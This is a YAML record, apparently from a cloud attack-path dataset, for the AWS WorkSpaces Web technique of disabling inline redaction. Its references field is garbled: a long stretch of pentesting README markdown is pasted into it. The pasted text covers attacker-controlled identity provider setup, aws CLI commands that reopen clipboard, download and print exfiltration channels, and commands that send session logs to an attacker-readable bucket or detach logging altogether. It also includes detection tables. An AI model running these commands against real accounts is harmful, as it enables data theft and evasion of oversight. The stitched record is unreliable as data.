- id: aws-s05-disable-inline-redaction
  provider: aws
  service: workspaces-web
  title: Disable inline redaction
  source: src/pentesting-cloud/aws-security/aws-post-exploitation/aws-workspaces-web-post-exploitation/README.md#disable-inline-redaction
  source_revision: 0b36331
  summary: The source may obtain Credential revealed through disabled browser redaction when the exact documented prerequisite is verified.
  requires:
    all_of:
    - action: workspaces-web:UpdateDataProtectionSettings
      resource: '*'
  target:
    kind: aws_verified_authority
    selector:
      aws_challenge_fact: aws-s05-disable-inline-redaction
    scope: same_account
    aggregate_as: Verified Credential revealed through disabled browser redaction in {account}
    grants:
    - Credential revealed through disabled browser redaction
  conditions:
  - id: exact_verified_prerequisites
    description: Exact attached settings, later authenticated session views a page containing data that matching redaction had hidden. No direct AWS IAM credential claim without content evidence. Missing or unverified evidence is UNKNOWN and must not emit a definite edge.
  blockers:
  - scp_or_boundary_deny
  confidence: conditional
  severity: high
  mitigation: Restrict the listed action on the exact resource and remove unnecessary access.
  references:
  - "https://<attacker-idp>/metadata\n```\n\nAfter configuring the returned WorkSpaces service-provider values in the attacker's IdP, that IdP can issue assertions for identities it controls. WorkSpaces Web still validates the SAML/OIDC protocol fields; the attack is the deliberate replacement of the trust anchor, not an assertion validation bypass.\n\n**Minimum permissions and prerequisites:** For a new provider, `workspaces-web:CreateIdentityProvider` on the target portal and prospective identity-provider resource patterns; for replacement, `UpdateIdentityProvider` on both the portal and exact provider ARNs. The portal must use standard federation rather than the IAM Identity Center-only setup, and the attacker must operate a compatible IdP. Both actions pass IAM authorization.\n\n**Impact:** Establish an independent portal login path that survives rotation of the original IdP credentials and grants access to internal applications reachable from the secure-browser network.\n\n**Stealth:**\
    \ Medium. The trust change is visible in management events and provider inventory, but later authentication appears to use a configured provider.\n\n<details>\n<summary>Logs generated</summary>\n\n| Event/evidence | Visibility and detection |\n| --- | --- |\n| `CreateIdentityProvider` / `UpdateIdentityProvider` | Default CloudTrail management events with portal/provider ARNs, type and metadata configuration. |\n| Portal authentication | Session/User Access logs can show usernames, sessions and source IPs if logging remains attached. |\n| Current trust | Inventory `ListIdentityProviders` and `GetIdentityProvider`; verify metadata URLs, issuer/audience, provider type and approved certificate fingerprints. |\n\n</details>\n\n### Re-enable clipboard, download, upload and print channels\n\n`UpdateUserSettings` can turn the main host/session transfer controls back on:\n\n```bash\naws workspaces-web update-user-settings \\\n  --user-settings-arn <user-settings-arn> \\\n  --copy-allowed Enabled\
    \ \\\n  --paste-allowed Enabled \\\n  --download-allowed Enabled \\\n  --upload-allowed Enabled \\\n  --print-allowed Enabled \\\n  --deep-link-allowed Enabled\n```\n\nThis converts a locked-down “view only” portal into a practical extraction path for a malicious or compromised user. Cookie-synchronization and toolbar configuration also live on this resource and must be reviewed when it changes.\n\n**Minimum permissions and prerequisites:** `workspaces-web:UpdateUserSettings` on an attached user-settings ARN and a user/session that can already reach valuable content. Creating or attaching a different resource additionally requires `CreateUserSettings` and `AssociateUserSettings` on the portal and settings ARNs. The update action alone passes IAM authorization.\n\n**Impact:** Export of rendered data or files from applications reachable only through the isolated browser, and import of attacker-controlled content into those applications.\n\n**Stealth:** Medium. The settings write is visible,\
    \ while permitted clipboard and file use is not recorded by CloudTrail. Session Logger can record transfer metadata when it remains enabled, but not clipboard contents or file contents.\n\n<details>\n<summary>Logs generated</summary>\n\n| Event/evidence | Visibility and detection |\n| --- | --- |\n| `UpdateUserSettings` | Default CloudTrail management event containing the changed transfer, deep-link, toolbar and cookie-synchronization configuration. |\n| `AssociateUserSettings` | Default management event if an alternate resource is attached to the portal. |\n| File/clipboard activity | Session Logger can record selected transfer event types and filenames/sizes; it deliberately omits transferred content. |\n| Current settings | Reconcile `GetUserSettings` against an approved baseline. |\n\n</details>\n\n## Telemetry tampering\n\n### Redirect or disable session and URL logging\n\nWorkSpaces Web offers a broad Session Logger to S3 and a narrower User Access log to Kinesis. `UpdateSessionLogger`\
    \ can send future session metadata to another accepted bucket, while the two `Disassociate*` actions remove the logging resources from a portal:\n\n```bash\naws workspaces-web update-session-logger \\\n  --session-logger-arn <session-logger-arn> \\\n  --log-configuration '{\n    \"s3\":{\n      \"bucket\":\"<attacker-readable-bucket>\",\n      \"keyPrefix\":\"portal/\",\n      \"bucketOwner\":\"<bucket-owner-account-id>\",\n      \"logFileFormat\":\"JSONLines\",\n      \"folderStructure\":\"NestedByDate\"\n    }\n  }'\n\naws workspaces-web disassociate-session-logger --portal-arn <portal-arn>\naws workspaces-web disassociate-user-access-logging-settings --portal-arn <portal-arn>\n```\n\nSession Logger records usernames, client/portal IPs, session IDs, full visited URLs and metadata about interactions, printing, clipboard direction, uploads and downloads. AWS states that it does not record clipboard content or transferred file content. User Access logging records start/end and URL visits,\
    \ but URL history can already miss incognito or deleted-history activity.\n\n**Minimum permissions and prerequisites:** For redirection, `workspaces-web:UpdateSessionLogger` on the attached logger ARN and a destination that accepts the WorkSpaces Web service's writes; satisfy the S3/KMS and expected-owner checks for that bucket. Updating the Kinesis path instead uses `UpdateUserAccessLoggingSettings` on its settings ARN and a usable stream. Blinding needs the relevant `DisassociateSessionLogger` or `DisassociateUserAccessLoggingSettings` permission on the portal ARN. Each WorkSpaces Web action independently reached the not-found boundary with only the corresponding action allowed.\n\n**Impact:** Collect future browsing/session metadata in an attacker-readable destination, or remove the defender's detailed record before other portal activity. This is metadata collection, not clipboard or file-content capture.\n\n**Stealth:** Medium. The configuration writes are high-signal management\
    \ events, but after disassociation there is no native session stream to report the browsing that follows.\n\n<details>\n<summary>Logs generated</summary>\n\n| Event/evidence | Visibility and detection |\n| --- | --- |\n| `UpdateSessionLogger` / `UpdateUserAccessLoggingSettings` | Default CloudTrail management events containing the destination. Alert on bucket owner, bucket/prefix, stream account and filter changes. |\n| `DisassociateSessionLogger` / `DisassociateUserAccessLoggingSettings` | Default management events; treat either as the last reliable control-plane detection point. |\n| S3 delivery | S3 object data events only when the destination is selected by a trail; bucket policy and access logs provide additional evidence. |\n| Kinesis delivery | Kinesis data-plane visibility depends on the account's selected telemetry; monitor stream policy and consumer changes separately. |\n| Delivery failures | Session Logger publishes target-not-found and access-denied CloudWatch metrics. |\n\
    \n</details>\n\n## References\n\n- [WorkSpaces Secure Browser service authorization](https://docs.aws.amazon.com/service-authorization/latest/reference/list_workspaces-web.html"
  - https://docs.aws.amazon.com/workspaces-web/latest/adminguide/browser-policies-custom.html
  notes: Requires an exact source/target evidence record; absent facts remain UNKNOWN.
